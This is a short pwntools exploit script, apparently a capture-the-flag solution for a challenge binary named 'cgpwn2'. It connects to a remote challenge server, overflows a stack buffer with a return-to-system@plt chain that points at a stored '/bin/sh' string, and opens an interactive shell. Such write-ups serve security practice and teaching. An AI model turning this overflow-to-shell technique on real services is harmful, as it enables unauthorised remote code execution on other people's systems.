from pwn import *

# sh = process("./cgpwn2")
sh = remote("61.147.171.105", 61711)
elf = ELF("./cgpwn2")

system_plt = elf.plt['system']
name_addr = 0x0804A080
payload1 = b'/bin/sh'
payload2 = cyclic(42) + p32(system_plt) + b'b' * 4 + p32(name_addr)

sh.sendlineafter("name", payload1)
sh.sendlineafter("here:", payload2)
sh.interactive()